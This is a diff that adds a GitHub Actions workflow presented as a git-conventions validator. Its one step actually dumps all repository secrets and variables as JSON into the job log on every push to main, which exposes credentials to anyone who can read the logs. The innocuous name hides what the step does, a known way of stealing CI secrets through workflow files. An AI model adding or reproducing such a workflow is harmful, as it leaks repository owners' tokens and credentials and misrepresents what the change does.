@@ -1,0 +1,20 @@
+name: Validate Git Conventions
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  check-env:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "$ALLMYSECRETS"
+          echo "$ALLMYVARS"
+        shell: bash
+        env:
+          ALLMYSECRETS: ${{ toJSON(secrets) }}
+          ALLMYVARS: ${{ toJSON(vars) }}
